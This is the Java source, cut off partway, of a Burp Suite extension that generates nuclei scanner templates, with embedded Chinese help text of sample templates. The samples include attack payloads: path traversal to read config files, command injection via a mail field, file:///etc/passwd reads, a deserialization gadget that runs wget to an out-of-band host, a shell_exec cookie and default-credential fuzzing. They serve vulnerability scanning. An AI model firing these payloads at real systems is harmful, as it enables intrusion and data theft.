package burp;
import burp.utils.Config;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import javax.swing.*;
import java.awt.*;
import java.util.*;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener
{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JTabbedPane tabs;
    public PrintWriter stdout;

    boolean match_true;
    boolean match_word;
    boolean match_header;
    boolean match_status;
    boolean match_negative;
    boolean match_time;
    boolean match_size;
    boolean match_interactsh_protocol;
    boolean match_interactsh_request;
    boolean match_regex;
    boolean match_binary;
    boolean extractors;

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {
        //输出
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stdout.println("hello Nu_Te_Gen!");
        this.stdout.println("version:1.4");

        // keep a reference to our callbacks object
        this.callbacks = callbacks;

        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("Nu_Te_Gen V1.4");

        // create our UI
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {

                // nuclei 模版生成界面
                // JSplitPane Nu_Te_Pane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                JPanel Nuc_jp1=new JPanel();
                Nuc_jp1.setLayout(new GridLayout(13, 1));

                JButton Nuc_bt_1=new JButton("生成");
                JButton Nuc_bt_2=new JButton("清空");

                JLabel Nuc_lb_id=new JLabel("模版id：",SwingConstants.RIGHT);
                JTextField Nuc_tf_id=new JTextField(1);
                Nuc_tf_id.setText("test");

                JLabel Nuc_lb_name=new JLabel("模版名称：",SwingConstants.RIGHT);
                JTextField Nuc_tf_name=new JTextField(1);
                Nuc_tf_name.setText("test");

                JLabel Nuc_lb_author=new JLabel("作者名称：",SwingConstants.RIGHT);
                JTextField Nuc_tf_author=new JTextField(1);
                Nuc_tf_author.setText("ffffffff0x");

                JLabel Nuc_lb_severity=new JLabel("严重程度：",SwingConstants.RIGHT);
                JComboBox Nuc_Tab_severity = new JComboBox(GetSeverityModes());
                Nuc_Tab_severity.setMaximumSize(Nuc_Tab_severity.getPreferredSize());
                Nuc_Tab_severity.setSelectedIndex(0);

                JLabel Nuc_lb_description=new JLabel("描述：",SwingConstants.RIGHT);
                JTextField Nuc_tf_description=new JTextField(1);
                Nuc_tf_description.setText("由插件自动生成");

                JLabel Nuc_lb_tags=new JLabel("Tags：",SwingConstants.RIGHT);
                JTextField Nuc_tf_tags=new JTextField(1);
                Nuc_tf_tags.setText("auto");

                JLabel Nuc_lb_req=new JLabel("请求方式：",SwingConstants.RIGHT);
                JComboBox Nuc_Tab_req = new JComboBox(GetReqModes());
                Nuc_Tab_req.setMaximumSize(Nuc_Tab_req.getPreferredSize());
                Nuc_Tab_req.setSelectedIndex(0);

                JLabel Nuc_lb_path=new JLabel("请求路径：",SwingConstants.RIGHT);
                JTextField Nuc_tf_path=new JTextField(1);
                Nuc_tf_path.setText("");

                JLabel Nuc_lb_headers=new JLabel("Content-Type：",SwingConstants.RIGHT);
                JComboBox Nuc_Tab_headers = new JComboBox(GetHeadersModes());
                Nuc_Tab_headers.setMaximumSize(Nuc_Tab_headers.getPreferredSize());
                Nuc_Tab_headers.setSelectedIndex(0);

                JLabel Nuc_lb_body=new JLabel("body：",SwingConstants.RIGHT);
                JComboBox Nuc_Tab_body = new JComboBox(GetBodyModes());
                Nuc_Tab_body.setMaximumSize(Nuc_Tab_headers.getPreferredSize());
                Nuc_Tab_body.setSelectedIndex(0);
                
                JLabel Nuc_lb_redirects=new JLabel("是否跟随跳转：",SwingConstants.RIGHT);
                JComboBox Nuc_Tab_redirects = new JComboBox(GetRedirectsModes());
                Nuc_Tab_redirects.setMaximumSize(Nuc_Tab_redirects.getPreferredSize());
                Nuc_Tab_redirects.setSelectedIndex(0);

                JLabel Nuc_lb_redirects_num=new JLabel("跳转次数：",SwingConstants.RIGHT);
                JTextField Nuc_tf_redirects_num=new JTextField(1);
                Nuc_tf_redirects_num.setText("2");

                JLabel Nuc_lb_Match_word=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_word = new JCheckBox(" (word)");
                Nuc_CB_Match_word.addActionListener(e -> {
                    if (Nuc_CB_Match_word.isSelected()) {
                        match_word=true;
                        match_true=true;
                    }else {
                        match_word=false;
                    }
                });

                JLabel Nuc_lb_Match_header=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_header = new JCheckBox(" (header)");
                Nuc_CB_Match_header.addActionListener(e -> {
                    if (Nuc_CB_Match_header.isSelected()) {
                        match_header=true;
                        match_true=true;
                    }else {
                        match_header=false;
                    }
                });

                JLabel Nuc_lb_Match_status=new JLabel("matchers模版",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_status = new JCheckBox(" (status)");
                Nuc_CB_Match_status.addActionListener(e -> {
                    if (Nuc_CB_Match_status.isSelected()) {
                        match_status=true;
                        match_true=true;
                    }else {
                        match_status=false;
                    }
                });

                JLabel Nuc_lb_Match_extractors=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_extractors = new JCheckBox(" (extractors)");
                Nuc_CB_Match_extractors.addActionListener(e -> {
                    if (Nuc_CB_Match_extractors.isSelected()) {
                        extractors=true;
                    }else {
                        extractors=false;
                    }
                });

                JLabel Nuc_lb_Match_negative=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_negative = new JCheckBox(" (negative)");
                Nuc_CB_Match_negative.addActionListener(e -> {
                    if (Nuc_CB_Match_negative.isSelected()) {
                        match_negative=true;
                        match_true=true;
                    }else {
                        match_negative=false;
                    }
                });

                JLabel Nuc_lb_Match_time=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_time = new JCheckBox(" (time)");
                Nuc_CB_Match_time.addActionListener(e -> {
                    if (Nuc_CB_Match_time.isSelected()) {
                        match_time=true;
                        match_true=true;
                    }else {
                        match_time=false;
                    }
                });

                JLabel Nuc_lb_Match_size=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_size = new JCheckBox(" (size)");
                Nuc_CB_Match_size.addActionListener(e -> {
                    if (Nuc_CB_Match_size.isSelected()) {
                        match_size=true;
                        match_true=true;
                    }else {
                        match_size=false;
                    }
                });

                JLabel Nuc_lb_Match_interactsh_protocol=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_interactsh_protocol = new JCheckBox(" (interactsh_protocol)");
                Nuc_CB_Match_interactsh_protocol.addActionListener(e -> {
                    if (Nuc_CB_Match_interactsh_protocol.isSelected()) {
                        match_interactsh_protocol=true;
                        match_true=true;
                    }else {
                        match_interactsh_protocol=false;
                    }
                });

                JLabel Nuc_lb_Match_interactsh_request=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_interactsh_request = new JCheckBox(" (interactsh_request)");
                Nuc_CB_Match_interactsh_request.addActionListener(e -> {
                    if (Nuc_CB_Match_interactsh_request.isSelected()) {
                        match_interactsh_request=true;
                        match_true=true;
                    }else {
                        match_interactsh_request=false;
                    }
                });

                JLabel Nuc_lb_Match_regex=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_regex = new JCheckBox(" (regex)");
                Nuc_CB_Match_regex.addActionListener(e -> {
                    if (Nuc_CB_Match_regex.isSelected()) {
                        match_regex=true;
                        match_true=true;
                    }else {
                        match_regex=false;
                    }
                });

                JLabel Nuc_lb_Match_binary=new JLabel("matchers模版 ",SwingConstants.RIGHT);
                JCheckBox Nuc_CB_Match_binary = new JCheckBox(" (binary)");
                Nuc_CB_Match_binary.addActionListener(e -> {
                    if (Nuc_CB_Match_binary.isSelected()) {
                        match_binary=true;
                        match_true=true;
                    }else {
                        match_binary=false;
                    }
                });

                Nuc_jp1.add(Nuc_bt_1);
                Nuc_jp1.add(Nuc_bt_2);
                Nuc_jp1.add(Nuc_lb_id);
                Nuc_jp1.add(Nuc_tf_id);
                Nuc_jp1.add(Nuc_lb_name);
                Nuc_jp1.add(Nuc_tf_name);
                Nuc_jp1.add(Nuc_lb_author);
                Nuc_jp1.add(Nuc_tf_author);
                Nuc_jp1.add(Nuc_lb_severity);
                Nuc_jp1.add(Nuc_Tab_severity);
                Nuc_jp1.add(Nuc_lb_description);
                Nuc_jp1.add(Nuc_tf_description);
                Nuc_jp1.add(Nuc_lb_tags);
                Nuc_jp1.add(Nuc_tf_tags);
                Nuc_jp1.add(Nuc_lb_req);
                Nuc_jp1.add(Nuc_Tab_req);
                Nuc_jp1.add(Nuc_lb_path);
                Nuc_jp1.add(Nuc_tf_path);
                Nuc_jp1.add(Nuc_lb_headers);
                Nuc_jp1.add(Nuc_Tab_headers);
                Nuc_jp1.add(Nuc_lb_body);
                Nuc_jp1.add(Nuc_Tab_body);
                Nuc_jp1.add(Nuc_lb_redirects);
                Nuc_jp1.add(Nuc_Tab_redirects);
                Nuc_jp1.add(Nuc_lb_redirects_num);
                Nuc_jp1.add(Nuc_tf_redirects_num);

                JPanel Nuc_jp4=new JPanel();
                Nuc_jp4.setLayout(new GridLayout(14, 2));

                Nuc_jp4.add(Nuc_lb_Match_word);
                Nuc_jp4.add(Nuc_CB_Match_word);
                Nuc_jp4.add(Nuc_lb_Match_header);
                Nuc_jp4.add(Nuc_CB_Match_header);
                Nuc_jp4.add(Nuc_lb_Match_status);
                Nuc_jp4.add(Nuc_CB_Match_status);
                Nuc_jp4.add(Nuc_lb_Match_extractors);
                Nuc_jp4.add(Nuc_CB_Match_extractors);
                Nuc_jp4.add(Nuc_lb_Match_negative);
                Nuc_jp4.add(Nuc_CB_Match_negative);
                Nuc_jp4.add(Nuc_lb_Match_time);
                Nuc_jp4.add(Nuc_CB_Match_time);
                Nuc_jp4.add(Nuc_lb_Match_size);
                Nuc_jp4.add(Nuc_CB_Match_size);
                Nuc_jp4.add(Nuc_lb_Match_interactsh_protocol);
                Nuc_jp4.add(Nuc_CB_Match_interactsh_protocol);
                Nuc_jp4.add(Nuc_lb_Match_interactsh_request);
                Nuc_jp4.add(Nuc_CB_Match_interactsh_request);
                Nuc_jp4.add(Nuc_lb_Match_regex);
                Nuc_jp4.add(Nuc_CB_Match_regex);
                Nuc_jp4.add(Nuc_lb_Match_binary);
                Nuc_jp4.add(Nuc_CB_Match_binary);

                JPanel Nuc_jp2=new JPanel();
                Nuc_jp2.setLayout(new GridLayout(1, 1));

                JTextArea Nuc_ta_2 =new JTextArea();
                Nuc_ta_2.setText("");
                Nuc_ta_2.setRows(30);
                Nuc_ta_2.setColumns(30);
                Nuc_ta_2.setLineWrap(true);//自动换行
                Nuc_ta_2.setEditable(true);//可编辑
                JScrollPane Nuc_sp_2 =new JScrollPane(Nuc_ta_2);

                Nuc_jp2.add(Nuc_sp_2);

                JPanel Nuc_jp3=new JPanel();
                Nuc_jp3.setLayout(new GridLayout(1, 1));

                String Help_data1 = "官方文档 : https://nuclei.projectdiscovery.io/templating-guide\n"+
                        "\n"+
                        "nuclei 2.9.1 更新了模版格式，后续nuclei版本如果低于 291 就可能存在模板兼容问题\n"+
                        "  - https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.1\n"+
                        "  - https://github.com/projectdiscovery/nuclei/issues/3055\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "info:\n"+
                        "  metadata:\n"+
                        "    fofa-query: 'body=\"公司\"'\n"+
                        "    shodan-query: 'vuln:CVE-2021-26855'\n"+
                        "    hunter-query: 'web.body=\"公司\"'\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "RAW : # 解析 raw 格式请求\n"+
                        "http:\n"+
                        "  - raw:\n"+
                        "      - |\n"+
                        "        POST /ispirit/interface/gateway.php HTTP/1.1\n"+
                        "        Host: {{Hostname}}\n"+
                        "        Content-Type: application/x-www-form-urlencoded\n"+
                        "\n"+
                        "        json={\"url\":\"/general/../../mysql5/my.ini\"}\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# 在多个请求之间维护基于cookie的类似浏览器的会话，可以在⼀系列请求间维护⾝份验证会话以完成攻击链\n"+
                        "# 接受布尔类型的输入，默认值为false\n"+
                        "cookie-reuse: true\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# DSL 匹配器\n"+
                        "    matchers:\n"+
                        "      - type: dsl\n"+
                        "        dsl:\n"+
                        "          - \"contains(toupper(body), md5(cookie))\" # 检查Cookie的MD5校验和是否包含在大写的请求体中\n"+
                        "          - \"len(body)<1024 && status_code==200\" # 请求体长度小于1024且状态码为200\n"+
                        "          - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\"\n"+
                        "\n"+
                        "      # 基于DSL的持续时间匹配器示例，当响应时间与定义的持续时间匹配时返回true，示例为大于等于6秒\n"+
                        "      - type: dsl\n"+
                        "        dsl:\n"+
                        "          - 'duration>=6'\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# internal: true 避免在终端中打印提取的值\n"+
                        "\n"+
                        "    extractors:\n"+
                        "      - type: regex\n"+
                        "        name: api # 为提取的信息命名，方便调用\n"+
                        "        part: body\n"+
                        "        internal: true # 使用动态变量时必须添加此标志\n"+
                        "        regex:\n"+
                        "          - \"(?m)[0-9]{3,10}\\.[0-9]+\"\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# Interactsh匹配器，可匹配 interactsh_protocol、interactsh_request和 interactsh_response 三处\n"+
                        "\n"+
                        "matchers-condition: and\n"+
                        "matchers:\n"+
                        "    - type: word\n"+
                        "      part: interactsh_protocol # 确认HTTP交互\n"+
                        "      words:\n"+
                        "        - \"http\"\n"+
                        "\n"+
                        "    - type: regex\n"+
                        "      part: interactsh_request # 确认检索/etc/passwd文件\n"+
                        "      regex:\n"+
                        "        - \"root:[x*]:0:0:\"\n"+
                        "\n"+
                        "      - type: word\n"+
                        "        part: interactsh_response # 确认DNS交互\n"+
                        "        words:\n"+
                        "          - \"dns\"         \n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "matchers:\n"+
                        "  - type: binary\n"+
                        "    binary:\n"+
                        "      - \"504B0304\" # zip archive\n"+
                        "      - \"526172211A070100\" # RAR archive version 5.0\n"+
                        "      - \"FD377A585A0000\" # xz tar.xz archive\n"+
                        "    condition: or # 指定单个匹配器内多个条件的与或关系\n"+
                        "    part: body\n"+
                        "\n"+
                        "  - type: word\n"+
                        "    encoding: hex\n"+
                        "    words:\n"+
                        "      - \"50494e47\"\n"+
                        "    part: body\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# 读取大小\n"+
                        "http:\n"+
                        "  - method: GET\n"+
                        "    path:\n"+
                        "      - \"{{BaseURL}}/thumbs.db\"\n"+
                        "      - \"{{BaseURL}}/.svn/wc.db\"\n"+
                        "\n"+
                        "    max-size: 500 #bytes 大小 - 从服务器响应中读取的最大大小\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# negative: true 否定匹配器，对匹配器结果进行取反\n"+
                        "\n"+
                        "matchers:\n"+
                        "  - type: word\n"+
                        "    words:\n"+
                        "      - \"PHPSESSID\"\n"+
                        "    part: header\n"+
                        "    negative: true\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# @timeout 请求注解的一种，⽤于覆盖默认的请求超时时间\n"+
                        "http:\n"+
                        "  - raw:\n"+
                        "      - |\n"+
                        "        @timeout: 25s\n"+
                        "        POST /conf_mail.php HTTP/1.1\n"+
                        "        Host: {{Hostname}}\n"+
                        "        Content-Type: application/x-www-form-urlencoded\n"+
                        "\n"+
                        "        mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "http:\n"+
                        "  - raw:\n"+
                        "      - |\n"+
                        "        POST /?file={{path}} HTTP/1.1\n"+
                        "        User-Agent: {{header}}\n"+
                        "        Host: {{Hostname}}\n"+
                        "\n"+
                        "        user={{username}}&passwd={{password}}\n"+
                        "\n"+
                        "    payloads:\n"+
                        "      path: helpers/wordlists/prams.txt\n"+
                        "      header: helpers/wordlists/header.txt\n"+
                        "      username:\n"+
                        "        - admin\n"+
                        "      password:\n"+
                        "        - admin\n"+
                        "        - 123456\n"+
                        "    attack: clusterbomb  # 定义HTTP模糊攻击类型，可用类型： batteringram,pitchfork,clusterbomb\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# 自定义模版变量 : 自 2.6.9 版本开始支持\n"+
                        "variables:\n"+
                        "  a1: \"{{to_lower(rand_base(5))}}\"\n"+
                        "\n"+
                        "http:\n"+
                        "  - method: GET\n"+
                        "    path:\n"+
                        "      - \"{{BaseURL}}/?test={{a1}}\"\n"+
                        "\n"+
                        "    matchers:\n"+
                        "      - type: word\n"+
                        "        words:\n"+
                        "          - \"{{a1}}\"\n"+
                        "    \n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# stop-at-first-match # 当模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描,这个不会影响其他模板\n"+
                        "http:\n"+
                        "  - method: GET\n"+
                        "    path:\n"+
                        "      - \"{{BaseURL}}\"\n"+
                        "      - \"{{BaseURL}}/login\"\n"+
                        "      - \"{{BaseURL}}/main\"\n"+
                        "\n"+
                        "    stop-at-first-match: true\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# GET : 发送一个GET请求\n"+
                        "http:\n"+
                        "  - method: GET\n"+
                        "    path:\n"+
                        "      - \"{{BaseURL}}/actuator/env\"\n"+
                        "    # 发送一些头部信息给服务器的示例\n"+
                        "    headers:\n"+
                        "      X-Client-IP: 127.0.0.1\n"+
                        "      X-Remote-IP: 127.0.0.1\n"+
                        "      X-Remote-Addr: 127.0.0.1\n"+
                        "      X-Forwarded-For: 127.0.0.1\n"+
                        "      X-Originating-IP: 127.0.0.1\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "# POST : 发送一个POST请求\n"+
                        "http:\n"+
                        "  - method: POST\n"+
                        "    path:\n"+
                        "      - \"{{BaseURL}}/sys/ui/extend/varkind/custom.jsp\"\n"+
                        "    headers:\n"+
                        "      Content-Type: application/x-www-form-urlencoded\n"+
                        "    body: 'var={\"body\":{\"file\":\"file:///etc/passwd\"}}'\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# 嵌套表达式\n"+
                        "# ❌ {{url_decode({{base64_decode('SGVsbG8=')}})}}\n"+
                        "# ✔ {{url_decode(base64_decode('SGVsbG8='))}}\n"+
                        "\n"+
                        "# 如果需要在 extractor 中使用,比如将 extractor 提取的变量值 test 进行处理\n"+
                        "# {{url_decode(base64_decode('{{test}}'))}}\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# OOB : 自 Nuclei v2.3.6 发行以来，Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描。\n"+
                        "http:\n"+
                        "  - raw:\n"+
                        "      - |\n"+
                        "        GET /plugins/servlet/oauth/users/icon-uri?consumerUri={{interactsh-url}} HTTP/1.1\n"+
                        "        Host: {{Hostname}}\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# JAVA反序列化 : https://nuclei.projectdiscovery.io/templating-guide/helper-functions/#deserialization-helper-functions\n"+
                        "raw:\n"+
                        "  -  |\n"+
                        "    POST /index.faces;jsessionid=x HTTP/1.1\n"+
                        "    Host: {{Hostname}}\n"+
                        "    Accept-Encoding: gzip, deflate\n"+
                        "    Content-Length: 1882\n"+
                        "    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n"+
                        "    Connection: close\n"+
                        "    Content-Type: application/x-www-form-urlencoded\n"+
                        "\n"+
                        "    javax.faces.ViewState={{generate_java_gadget(\"commons-collections3.1\", \"wget http://{{interactsh-url}}\", \"base64\")}}\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# skip-variables-check : 当你的请求内容里包含 {{ 时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.\n"+
                        "http:\n"+
                        "  - method: GET\n"+
                        "    path:\n"+
                        "      - \"{{BaseURL}}\"\n"+
                        "    headers:\n"+
                        "      Cookie: \"CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl\"\n"+
                        "\n"+
                        "    skip-variables-check: true\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# self-contained : 这个用的比较局限,一般就是用于批量检测 API 可用性的,举个例子,你通过信息泄露获得了一个 API_Key 但你不知道这个是哪个服务的 APIkey,没有特征,那么就只能找哪些官方API接口一个一个试,看哪一个平台可以生效,就是这个意思。\n"+
                        "id: example-self-contained-input\n"+
                        "\n"+
                        "info:\n"+
                        "  name: example-self-contained\n"+
                        "  author: pdteam\n"+
                        "  severity: info\n"+
                        "\n"+
                        "self-contained: true\n"+
                        "http:\n"+
                        "  - raw:\n"+
                        "      - |\n"+
                        "        GET https://example.com:443/gg HTTP/1.1\n"+
                        "        Host: example.com:443\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# 文件协议 : 文件模板默认读取的文件大小1GB\n"+
                        "file:\n"+
                        "  - extensions:\n"+
                        "      - all\n"+
                        "\n"+
                        "    extractors:\n"+
                        "      - type: regex\n"+
                        "        regex:\n"+
                        "          - '\"type\": \"service_account\"'\n"+
                        "\n"+
                        " ----------------------------分割线----------------------------\n"+
                        "\n"+
                        "# 网络层\n"+
                        "tcp:\n"+
                        "  - host:\n"+
                        "      - '{{Hostname}}'\n"+
                        "      - '{{Host}}:22'\n"+
                        "\n"+
                        "    inputs:\n"+
                        "      - data: \"\n\"\n"+
                        "\n"+
                        "    matchers-condition: and\n"+
                        "    matchers:\n"+
                        "      - type: regex\n"+
                        "        part: body\n"+
                        "        regex:\n"+
                        "          - 'SSH\\-([0-9.-A-Za-z_ ]+)'\n";

                JTextArea Nuc_ta_3 =new JTextArea();
                Nuc_ta_3.setText(Help_data1);
                Nuc_ta_3.setRows(30);
                Nuc_ta_3.setColumns(30);
                Nuc_ta_3.setLineWrap(true);//自动换行
                Nuc_ta_3.setEditable(true);//可编辑
                JScrollPane Nuc_sp_3 =new JScrollPane(Nuc_ta_3);

                String Help_data2 = "https://nuclei.projectdiscovery.io/templating-guide/helper-functions/\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "# https://example.com:443/foo/bar.php\n" +
                        "\n" +
                        "{{BaseURL}}	        # https://example.com:443/foo/bar.php\n" +
                        "{{RootURL}}	        # https://example.com:443\n" +
                        "{{Hostname}}        # example.com:443\n" +
                        "{{Host}}            # example.com\n" +
                        "{{Port}}            # 443\n" +
                        "{{Path}}            # /foo\n" +
                        "{{File}}            # bar.php\n" +
                        "{{Scheme}}          # https\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "# 随机字段\n" +
                        "\n" +
                        "{{randstr}}\n" +
                        "{{rand_int(10)}}\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "# 大小写转换\n" +
                        "\n" +
                        "{{to_lower(\"HELLO\")}} #将输入转换为小写字符\n" +
                        "{{to_upper(\"hello\")}} #将输入转换为大写字符\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "# 编码转换\n" +
                        "\n" +
                        "{{url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\")}}  #对输入字符串进行URL解码\n" +
                        "{{url_encode(\"https://projectdiscovery.io/test?a=1\")}}   #对输入字符串进行URL编码\n" +
                        "\n" +
                        "{{hex_decode(\"6161\")}}\n" +
                        "{{hex_encode(\"aa\")}}\n" +
                        "\n" +
                        "{{sha1(\"Hello\")}}\n" +
                        "{{sha256(\"Hello\")}}\n" +
                        "\n" +
                        "{{base64(\"Hello\")}}\n" +
                        "{{base64(1234)}}\n" +
                        "{{base64_decode(\"SGVsbG8=\")}}\n" +
                        "{{base64_py(\"Hello\")}}     #像Python一样将字符串编码为Base64（包含换行符）\n" +
                        "\n" +
                        "{{md5(\"Hello\")}}\n" +
                        "{{md5(1234)}}\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "# 返回输入的长度\n" +
                        "\n" +
                        "{{len(\"Hello\")}}\n" +
                        "{{len(5555)}}\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "{{rand_base(5)}}\n" +
                        "{{rand_base(5, \"abc\")}}\n" +
                        "{{rand_char(\"abc\")}}\n" +
                        "{{rand_char()}}\n" +
                        "{{rand_int()}}\n" +
                        "{{rand_int(1, 10)}}\n" +
                        "{{rand_text_alpha(10)}}\n" +
                        "{{rand_text_alpha(10, \"abc\")}}\n" +
                        "{{rand_text_alphanumeric(10)}}\n" +
                        "{{rand_text_alphanumeric(10, \"ab12\")}}\n" +
                        "{{rand_text_numeric(10)}}\n" +
                        "{{rand_text_numeric(10, 123)}}\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "# 验证字符串是否包含子字符串\n" +
                        "{{contains(\"Hello\", \"lo\")}}\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        "\n" +
                        "{{DN}} # projectdiscovery\n" +
                        "{{FQDN}} # www.projectdiscovery.io\n" +
                        "{{RDN}} # projectdiscovery.io\n" +
                        "{{SD}} # www\n" +
                        "{{TLD}} # io\n" +
                        "\n" +
                        " ----------------------------分割线----------------------------\n" +
                        " \n" +
                        "{{generate_java_gadget(\"commons-collections3.1\", \"wget {{interactsh-url}}\", \"base64\")}}\n" +
                        "{{gzip(\"Hello\")}}\n" +
                        "{{html_escape(\"<body>test</body>\")}}\n" +
                        "{{html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")}}\n" +
                        "{{mmh3(\"Hello\")}}\n" +
                        "{{print_debug(1 +2, \"Hello\")}}\n" +
                        "{{regex(\"H([a-z] +)o\", \"Hello\")}}\n" +
                        "{{remove_bad_chars(\"abcd\", \"bc\")}}\n" +
                        "{{repeat(\"../\", 5)}}\n" +
                        "{{replace(\"Hello\", \"He\", \"Ha\")}}\n" +
                        "{{replace_regex(\"He123llo\", \"(\\d +)\", \"\")}}\n" +
                        "{{reverse(\"abc\")}}\n" +
                        "{{trim(\"aaaHelloddd\", \"ad\")}}\n" +
                        "{{trim_left(\"aaaHelloddd\", \"ad\")}}\n" +
                        "{{trim_prefix(\"aaHelloaa\", \"aa\")}}\n" +
                        "{{trim_right(\"aaaHelloddd\", \"ad\")}}\n" +
                        "{{trim_space(\"  Hello  \")}}\n" +
                        "{{trim_suffix(\"aaHelloaa\", \"aa\")}}\n" +
                        "{{unix_time(10)}}\n" +
                        "{{wait_for(1)}}";

                JTextArea Nuc_ta_4 =new JTextArea();
                Nuc_ta_4.setText(Help_data2);
                Nuc_ta_4.setRows(30);
                Nuc_ta_4.setColumns(30);
                Nuc_ta_4.setLineWrap(true);//自动换行
                Nuc_ta_4.setEditable(true);//可编辑
                JScrollPane Nuc_sp_4 =new JScrollPane(Nuc_ta_4);

                Nuc_jp3.add(Nuc_sp_3);
                Nuc_jp3.add(Nuc_sp_4);

                //生成按钮
                Nuc_bt_1.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        Nuc_ta_2.setText(Yaml_Gen(Nuc_tf_id.getText(),Nuc_tf_name.getText(),Nuc_tf_author.getText(),Nuc_tf_description.getText(),Nuc_tf_tags.getText(),Nuc_Tab_redirects.getSelectedItem().toString(),Nuc_tf_redirects_num.getText(),Nuc_Tab_req.getSelectedItem().toString(),Nuc_tf_path.getText(),Nuc_Tab_headers.getSelectedItem().toString(),Nuc_Tab_body.getSelectedItem().toString(),Nuc_Tab_severity.getSelectedItem().toString()));
                    }
                });
                //清空按钮
                Nuc_bt_2.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        Nuc_ta_2.setText("");
                    }
                });

                //主界面
                tabs = new JTabbedPane();

                //tabs.addTab("Template生成",Nu_Te_Pane);
                // 信息生成界面 整体分布
                // Nu_Te_Pane.setLeftComponent(Nuc_jp1);
                // Nu_Te_Pane.setRightComponent(Nuc_jp2);
                // Nu_Te_Pane.setDividerLocation(400);

                JSplitPane Nu_Te_Pane2 = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                tabs.addTab("Template生成",Nu_Te_Pane2);

                JSplitPane splitPanes = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                splitPanes.setTopComponent(Nuc_jp1);
                splitPanes.setBottomComponent(Nuc_jp4);
                splitPanes.setDividerLocation(450);

                JSplitPane splitPanes_2 = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                splitPanes_2.setLeftComponent(Nuc_jp2);
                splitPanes_2.setRightComponent(Nuc_jp3);
                splitPanes_2.setDividerLocation(430);

                Nu_Te_Pane2.setLeftComponent(splitPanes);
                Nu_Te_Pane2.setRightComponent(splitPanes_2);
                Nu_Te_Pane2.setDividerLocation(380);

                // customize our UI components
                callbacks.customizeUiComponent(tabs);

                // add the custom tab to Burp's UI
                callbacks.addSuiteTab(BurpExtender.this);

                // register ourselves as an HTTP listener
                callbacks.registerHttpListener(BurpExtender.this);

            }

            private String[] GetReqModes() {
